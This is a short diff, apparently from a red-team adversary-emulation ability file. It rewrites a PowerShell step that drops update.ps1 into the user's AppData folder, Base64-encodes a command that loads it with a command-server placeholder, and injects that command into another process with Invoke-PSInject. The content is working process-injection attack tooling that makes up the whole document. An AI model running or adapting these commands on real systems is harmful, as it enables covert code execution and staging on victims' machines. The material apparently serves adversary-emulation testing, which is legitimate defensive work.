@@ -14,7 +14,7 @@
       psh,pwsh:
         command: |
           Import-Module .\Invoke-PSInject.ps1 -Verbose -Force;
-          Inject -PoshCode SQBtAHAAbwByAHQALQBNAG8AZAB1AGwAZQAgACQAZQBuAHYAOgBBAFAAUABEAEEAVABBAFwAdQBwAGQAYQB0AGUALgBwAHMAMQA7AHUAcABkAGEAdABlAA==
-        payload: Invoke-PSInject.ps1
-
-# Encoded command: Import-Module $env:APPDATA\update.ps1;update
+          Move-Item -Path .\update.ps1 -Destination $env:APPDATA -Force;
+          $pcode = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("Import-Module $env:APPDATA\update.ps1;update('#{server}')"));
+          Inject -PoshCode $pcode;
+        payload: update.ps1,Invoke-PSInject.ps1
